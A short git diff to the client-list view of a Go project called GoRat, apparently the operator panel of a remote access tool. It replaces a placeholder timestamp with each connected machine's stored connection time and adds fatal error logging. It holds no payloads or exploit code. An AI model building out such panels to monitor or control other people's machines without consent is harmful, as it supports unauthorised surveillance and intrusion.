@@ -6,6 +6,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/pterm/pterm"
 	go_rat "github.com/AllenDang/giu"
 	"github.com/NotKatsu/GoRat/modules/database"
 )
@@ -36,7 +37,7 @@ func CreateClientTable() []*go_rat.TableRowWidget {
 		storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", conn.LastHeartbeatTime)
 
 		if err != nil {
-			fmt.Println("Error parsing time:", err)
+			pterm.Fatal.WithFatal(true).Println(err)
 		}
 		currentTime := time.Now()
 		timeDifference := currentTime.Sub(storedTime)
@@ -60,11 +61,23 @@ func CreateClientTable() []*go_rat.TableRowWidget {
 				}
 			}
 
+			connectionTime := database.GetConnectionTime(conn.ID)
+			layout := "2006-01-02 15:04:05.9999999-07:00"
+
+			dbTime, err := time.Parse(layout, connectionTime)
+
+			if err != nil {
+				pterm.Fatal.WithFatal(true).Println(err)
+			}
+			outputLayout := "15:04:05 02/01/2006"
+
+			outputTimeStr := dbTime.Format(outputLayout)
+
 			row := go_rat.TableRow(
 				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.MACAddress)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
 				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.OS)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
 				go_rat.Label(fmt.Sprintf("%v", NewEncodedDataStruct.Name)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
-				go_rat.Label(fmt.Sprintf("%v", "15:20:21")), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
+				go_rat.Label(fmt.Sprintf("%v", outputTimeStr)), CreateClientContextMenu(NewEncodedDataStruct.MACAddress),
 			)
 
 			rows = append(rows, row)
